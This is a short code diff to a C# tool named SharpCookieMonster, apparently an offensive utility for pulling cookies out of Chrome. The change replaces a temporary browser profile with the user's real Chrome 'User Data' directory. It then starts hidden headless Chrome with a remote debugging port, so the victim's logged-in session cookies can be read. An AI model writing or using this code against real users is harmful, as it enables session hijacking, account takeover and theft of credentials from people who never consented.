@@ -118,13 +118,9 @@ namespace SharpCookieMonster
                 }
                 chrome.StartInfo.UseShellExecute = false;
                 chrome.StartInfo.FileName = path;
-                var temp = Path.GetTempPath() + Path.GetRandomFileName();
-                if (temp.Contains("."))
-                {
-                    temp = temp.Substring(0, temp.LastIndexOf(".") - 1);
-                }
-                Console.WriteLine("[*] Using temp dir: " + temp);
-                chrome.StartInfo.Arguments = String.Format("\"{0}\" --headless --user-data-dir=\"{1}\" --remote-debugging-port={2}", url, temp, port);
+                var userdata = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data";
+                Console.WriteLine("[*] Using data path: " + userdata);
+                chrome.StartInfo.Arguments = String.Format("\"{0}\" --headless --user-data-dir=\"{1}\" --remote-debugging-port={2}", url, userdata, port);
                 chrome.StartInfo.CreateNoWindow = true;
                 chrome.OutputDataReceived += (sender, args) => Console.WriteLine("[*][Chrome] {0}", args.Data);
                 chrome.ErrorDataReceived += (sender, args) => Console.WriteLine("[-][Chrome] {0}", args.Data);
